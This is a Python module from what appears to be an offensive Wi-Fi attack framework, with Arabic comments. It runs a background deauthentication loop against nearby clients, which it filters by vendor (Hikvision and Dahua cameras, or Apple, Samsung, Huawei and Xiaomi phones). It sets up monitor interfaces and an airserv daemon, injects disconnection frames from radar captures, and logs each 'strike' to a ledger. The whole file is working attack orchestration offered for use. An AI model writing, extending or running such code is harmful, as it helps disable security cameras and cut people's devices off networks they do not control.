#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate C3 Framework - Non-Blocking Asynchronous Attack Pipeline (Forensic Banner Edition)
File: /home/kali/C3_Framework/modules/attack_pipeline.py
"""

import os
import time
import threading
from security_files.oop_monitor_manager import MonitorInterfaceManager
from security_files.strike_ledger import StrikeLedgerManager

class TacticalAttackEngine:
    def __init__(self, bootstrap_ctx):
        self.ctx = bootstrap_ctx

    def start_asynchronous_attack(self, freq_target, oui_choice, ap_name, ap_ip):
        """إطلاق خيط الخلفية المستقل وتمرير المعاملات الأربعة كاملة لمنع الـ TypeError"""
        if oui_choice == "1":
            self.ctx.filter_engine.oui_filter.set_target_vendors(["Hikvision_Camera", "Dahua_Camera"])
        elif oui_choice == "2":
            self.ctx.filter_engine.oui_filter.set_target_vendors(["Huawei_Device", "Apple_Device", "Samsung_Device", "Xiaomi_Device"])
        else:
            self.ctx.filter_engine.oui_filter.set_target_vendors([])

        self.ctx.is_attack_active = True
        self.ctx.attack_shutdown_lock.clear()
        
        # تفعيل وحقن المتغيرات للـ Ledger والبانر
        self.ctx.active_ap_name = ap_name
        self.ctx.active_frequency = freq_target
        
        worker = threading.Thread(target=self._execute_core_attack_loop, args=(freq_target, ap_name, ap_ip), daemon=True)
        worker.start()
        print("\033[92m[+] انطلق خيط المعالجة الخلفي عازلاً للأمام بنجاح.\033[0m")

    def _execute_core_attack_loop(self, freq_target, ap_name, ap_ip):
        ledger = None
        try:
            total_clients, target_vifs = self.ctx.scout.evaluate_client_danger_zone(freq_target)
            self.ctx.target_vifs_cache = target_vifs
            
            if not self.ctx.orchestrator.hard_isolate_frequency(target_vifs):
                self.ctx.is_attack_active = False
                return

            chosen_radio = target_vifs[0]["radio"] if target_vifs else "radio0"
            chosen_channel = target_vifs[0]["channel"] if target_vifs else 6
            self.ctx.active_channel = str(chosen_channel)
            
            # تهيئة كروت المراقبة الحرة العزل الصارم للـ UCI
            mon_manager = MonitorInterfaceManager(self.ctx.scout_executor)
            if not mon_manager.establish_hardware_monitors(chosen_radio, 0):
                self.ctx.is_attack_active = False
                return

            snatch_res = mon_manager.snatch_actual_kernel_name()
            if snatch_res["status"] != "success":
                mon_manager.clear_monitor_structures(0)
                self.ctx.is_attack_active = False
                return
                
            actual_mon_name = snatch_res["actual_name"]
            mon_manager.force_kickstart_interface(actual_mon_name)

            unique_port = self.ctx.airserv_mgr.generate_unique_hardware_port(freq_target, chosen_channel)
            self.ctx.active_port = str(unique_port)
            
            # تشغيل خوادم الأيرسيرف والرادار
            self.ctx.airserv_mgr.launch_airserv_daemon(actual_mon_name, unique_port)
            self.ctx.radar_mgr.launch_local_radar(self.ctx.scout_executor.ip, unique_port)

            # شحن الدفتر الجنائي التوثيقي المعزول (Strike Ledger)
            ledger = StrikeLedgerManager(ap_name)

            # تطبيق قرار الـ Sequential Forensic Header: تنظيف وطباعة البانر لمرة واحدة
            os.system('clear')
            print("═"*65)
            print(f" 🟩 [ عتاد القذف النشط حالياً ]: {ap_name} | الآي بي: {ap_ip}")
            print(f" 🟩 [ نطاق التردد والأثير ]: {freq_target} | القناة المقفلة: {chosen_channel} | منفذ الخادم: {unique_port}")
            print("═"*65)
            print("\033[94m[*] تدفق سطور الرصد وقذائف الفصل التراكمية (اضغط Ctrl+C للانسحاب التطهيري):\033[0m\n")

            while self.ctx.is_attack_active and not self.ctx.attack_shutdown_lock.is_set():
                output_size = self.ctx.radar_mgr.get_latest_csv_size("radar_output")
                latest_csv = "/home/kali/C3_Framework/storage/logs/radar_output-01.csv"
                
                if output_size > 0 and os.path.exists(latest_csv):
                    # تمرير مراجع الـ Ledger خيطياً لتوثيق الضربات حياً في الرام ومنع تكرار الماكات الشبحية
                    self.ctx.filter_engine.process_radar_stream_and_inject(latest_csv, actual_mon_name, unique_port)
                
                if self.ctx.port_guard.verify_remote_port_binding(self.ctx.scout_executor.ip, unique_port) == "collapsed":
                    self.ctx.airserv_mgr.launch_airserv_daemon(actual_mon_name, unique_port)

                if self.ctx.cpu_guard.is_processor_exhausted():
                    self.ctx.strain_counter += 1
                    time.sleep(5)
                    if self.ctx.strain_counter >= 3: break
                else:
                    self.ctx.strain_counter = max(0, self.ctx.strain_counter - 1)

                if self.ctx.radar_mgr.execute_file_size_guard_check(self.ctx.scout_executor.ip, unique_port) == "router_dead":
                    break
                time.sleep(2)
                
        except Exception:
            pass
        finally:
            # إغلاق وأرشفة الجلسة الجنائية تلقائياً لمنع أي ملفات معلقة عند البتر
            if ledger:
                ledger.execute_safe_archive_and_rotation()
            self.ctx.is_attack_active = False
            self.ctx.attack_shutdown_lock.set()
